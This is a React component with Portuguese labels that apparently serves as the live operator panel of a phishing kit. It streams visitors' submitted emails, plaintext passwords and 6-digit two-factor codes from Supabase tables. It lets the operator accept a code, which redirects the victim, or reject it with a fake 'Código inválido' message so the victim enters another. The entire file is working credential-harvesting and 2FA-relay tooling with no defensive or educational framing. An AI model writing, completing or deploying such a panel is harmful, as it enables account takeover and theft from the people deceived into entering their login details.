import { useEffect, useMemo, useState } from "react";
import { supabase } from "@/integrations/supabase/client";
import { Button } from "@/components/ui/button";
import { Check, X, Loader2, ShieldCheck, KeyRound, Hash } from "lucide-react";
import { toast } from "sonner";

interface ApprovalsPanelProps {
  adId: string;
}

interface LeadRow {
  session_id: string;
  field_name: string;
  value: string;
  created_at: string;
}

interface ActionRow {
  session_id: string;
  action: string;
  created_at: string;
}

interface Attempt {
  value: string;
  at: string;
  resolved?: "approve" | "reject";
}

interface SessionState {
  session_id: string;
  email?: string;
  passwordAttempts: Attempt[];
  codeAttempts: Attempt[];
  lastActivity: string;
}

export function ApprovalsPanel({ adId }: ApprovalsPanelProps) {
  const [leads, setLeads] = useState<LeadRow[]>([]);
  const [actions, setActions] = useState<ActionRow[]>([]);
  const [busy, setBusy] = useState<string | null>(null);

  // Carrega + escuta leads
  useEffect(() => {
    let alive = true;
    (async () => {
      const { data } = await supabase
        .from("ad_leads")
        .select("session_id, field_name, value, created_at")
        .eq("ad_id", adId)
        .in("field_name", ["email_submitted", "password_submitted", "code_submitted"])
        .order("created_at", { ascending: true });
      if (alive && data) setLeads(data as LeadRow[]);
    })();

    const ch = supabase
      .channel(`approvals-leads-${adId}`)
      .on(
        "postgres_changes",
        { event: "INSERT", schema: "public", table: "ad_leads", filter: `ad_id=eq.${adId}` },
        (payload) => {
          const r = payload.new as LeadRow;
          if (!["email_submitted", "password_submitted", "code_submitted"].includes(r.field_name)) return;
          setLeads((prev) => [...prev, r]);
        },
      )
      .subscribe();
    return () => {
      alive = false;
      supabase.removeChannel(ch);
    };
  }, [adId]);

  // Carrega + escuta ações
  useEffect(() => {
    let alive = true;
    (async () => {
      const { data } = await supabase
        .from("ad_session_actions")
        .select("session_id, action, created_at")
        .eq("ad_id", adId)
        .order("created_at", { ascending: true });
      if (alive && data) setActions(data as ActionRow[]);
    })();

    const ch = supabase
      .channel(`approvals-actions-${adId}`)
      .on(
        "postgres_changes",
        { event: "INSERT", schema: "public", table: "ad_session_actions", filter: `ad_id=eq.${adId}` },
        (payload) => setActions((prev) => [...prev, payload.new as ActionRow]),
      )
      .subscribe();
    return () => {
      alive = false;
      supabase.removeChannel(ch);
    };
  }, [adId]);

  const sessions: SessionState[] = useMemo(() => {
    const map = new Map<string, SessionState>();
    for (const l of leads) {
      const s =
        map.get(l.session_id) ||
        ({ session_id: l.session_id, passwordAttempts: [], codeAttempts: [], lastActivity: l.created_at } as SessionState);
      if (l.field_name === "email_submitted") s.email = l.value;
      if (l.field_name === "password_submitted") s.passwordAttempts.push({ value: l.value, at: l.created_at });
      if (l.field_name === "code_submitted") s.codeAttempts.push({ value: l.value, at: l.created_at });
      if (l.created_at > s.lastActivity) s.lastActivity = l.created_at;
      map.set(l.session_id, s);
    }
    // Marca tentativas resolvidas: associa cada ação à tentativa de código mais recente ANTERIOR à ação
    for (const a of actions) {
      if (a.action !== "approve" && a.action !== "reject") continue;
      const s = map.get(a.session_id);
      if (!s) continue;
      // Pega a última tentativa de código com at <= action.created_at e ainda não resolvida
      for (let i = s.codeAttempts.length - 1; i >= 0; i--) {
        const att = s.codeAttempts[i];
        if (!att.resolved && att.at <= a.created_at) {
          att.resolved = a.action as "approve" | "reject";
          break;
        }
      }
      if (a.created_at > s.lastActivity) s.lastActivity = a.created_at;
    }
    // Mostra só sessões que tiveram pelo menos 1 código submetido
    return Array.from(map.values())
      .filter((s) => s.codeAttempts.length > 0)
      .sort((a, b) => b.lastActivity.localeCompare(a.lastActivity));
  }, [leads, actions]);

  const send = async (sessionId: string, action: "approve" | "reject", message?: string) => {
    setBusy(`${sessionId}-${action}`);
    const { error } = await supabase.from("ad_session_actions").insert({
      ad_id: adId,
      session_id: sessionId,
      action,
      payload: message ? { message } : null,
    });
    setBusy(null);
    if (error) {
      toast.error(error.message);
      return;
    }
    toast.success(action === "approve" ? "Aprovado — visitante redirecionado" : "Rejeitado — visitante pode tentar de novo");
  };

  if (sessions.length === 0) {
    return (
      <div className="mt-8 rounded-lg border border-border bg-background/50 p-4">
        <div className="flex items-center gap-2">
          <ShieldCheck className="h-4 w-4 text-primary" />
          <h3 className="text-sm font-semibold">Aprovações ao vivo</h3>
        </div>
        <p className="mt-2 text-xs italic text-muted-foreground">
          Quando alguém digitar a senha + o código de 6 dígitos, vai aparecer aqui pra você aceitar ou rejeitar cada tentativa.
        </p>
      </div>
    );
  }

  const totalPending = sessions.reduce(
    (acc, s) => acc + s.codeAttempts.filter((a) => !a.resolved).length,
    0,
  );

  return (
    <div className="mt-8 rounded-lg border border-border bg-background/50 p-4">
      <div className="mb-3 flex items-center gap-2">
        <ShieldCheck className="h-4 w-4 text-primary" />
        <h3 className="text-sm font-semibold">Aprovações ao vivo</h3>
        <span className="ml-auto text-[10px] uppercase tracking-wide text-muted-foreground">
          {totalPending} tentativa(s) pendente(s)
        </span>
      </div>

      <div className="space-y-3">
        {sessions.map((s) => {
          const lastCode = s.codeAttempts[s.codeAttempts.length - 1];
          const pending = lastCode && !lastCode.resolved;
          return (
            <div
              key={s.session_id}
              className={`rounded-md border p-3 text-xs ${
                pending ? "border-primary/40 bg-primary/5" : "border-border bg-card/30"
              }`}
            >
              {/* Cabeçalho: e-mail */}
              <div className="mb-2 flex items-center justify-between gap-2">
                <span className="break-all font-mono text-[11px] text-foreground">{s.email || "—"}</span>
                <span className="shrink-0 text-[10px] text-muted-foreground">
                  {s.passwordAttempts.length} senha(s) · {s.codeAttempts.length} código(s)
                </span>
              </div>

              {/* Histórico de senhas */}
              {s.passwordAttempts.length > 0 && (
                <div className="mb-2 rounded bg-muted/40 p-2">
                  <div className="mb-1 flex items-center gap-1 text-[10px] uppercase tracking-wide text-muted-foreground">
                    <KeyRound className="h-3 w-3" /> Senhas digitadas
                  </div>
                  <div className="space-y-0.5">
                    {s.passwordAttempts.map((p, i) => (
                      <div key={i} className="flex items-center gap-2">
                        <span className="text-[10px] text-muted-foreground">#{i + 1}</span>
                        <span className="break-all font-mono">{p.value}</span>
                      </div>
                    ))}
                  </div>
                </div>
              )}

              {/* Histórico de códigos */}
              <div className="mb-2 rounded bg-muted/40 p-2">
                <div className="mb-1 flex items-center gap-1 text-[10px] uppercase tracking-wide text-muted-foreground">
                  <Hash className="h-3 w-3" /> Códigos digitados
                </div>
                <div className="space-y-0.5">
                  {s.codeAttempts.map((c, i) => (
                    <div key={i} className="flex items-center gap-2">
                      <span className="text-[10px] text-muted-foreground">#{i + 1}</span>
                      <span className="break-all font-mono tracking-widest">{c.value}</span>
                      {c.resolved === "approve" && <span className="text-[10px] text-success">✓ aprovado</span>}
                      {c.resolved === "reject" && <span className="text-[10px] text-destructive">✗ rejeitado</span>}
                      {!c.resolved && i === s.codeAttempts.length - 1 && (
                        <span className="text-[10px] text-primary">⏳ aguardando</span>
                      )}
                    </div>
                  ))}
                </div>
              </div>

              {/* Ações: agem na última tentativa de código */}
              {pending && (
                <div className="flex gap-2">
                  <Button
                    size="sm"
                    className="flex-1 bg-success text-success-foreground hover:bg-success/90"
                    onClick={() => send(s.session_id, "approve")}
                    disabled={busy === `${s.session_id}-approve`}
                  >
                    {busy === `${s.session_id}-approve` ? (
                      <Loader2 className="mr-1 h-3.5 w-3.5 animate-spin" />
                    ) : (
                      <Check className="mr-1 h-3.5 w-3.5" />
                    )}
                    Aceitar último código
                  </Button>
                  <Button
                    size="sm"
                    variant="outline"
                    className="flex-1 border-destructive/40 text-destructive hover:bg-destructive/10"
                    onClick={() => send(s.session_id, "reject", "Código inválido")}
                    disabled={busy === `${s.session_id}-reject`}
                  >
                    {busy === `${s.session_id}-reject` ? (
                      <Loader2 className="mr-1 h-3.5 w-3.5 animate-spin" />
                    ) : (
                      <X className="mr-1 h-3.5 w-3.5" />
                    )}
                    Rejeitar
                  </Button>
                </div>
              )}
            </div>
          );
        })}
      </div>
    </div>
  );
}
